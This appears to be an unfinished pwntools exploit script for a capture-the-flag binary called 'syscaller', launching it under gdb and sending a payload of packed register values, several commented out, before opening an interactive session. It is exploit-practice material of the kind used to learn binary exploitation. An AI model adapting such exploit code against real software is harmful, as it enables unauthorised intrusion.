from pwn import * 

context.arch = "amd64"

elf = ELF("syscaller")

target =gdb.debug("./syscaller")


payload = p64(0x0) # r12
payload += p64(0x0) # r11
payload += p64(0x0) # RDI
#payload += p64(0xf) # RAX
#payload += p64(0x0) # RBX
payload += p64(0x0) # RDX
#payload += p64(0x0) # RSI
#payload += p64(0x0) # RDI

target.send(payload)

target.interactive()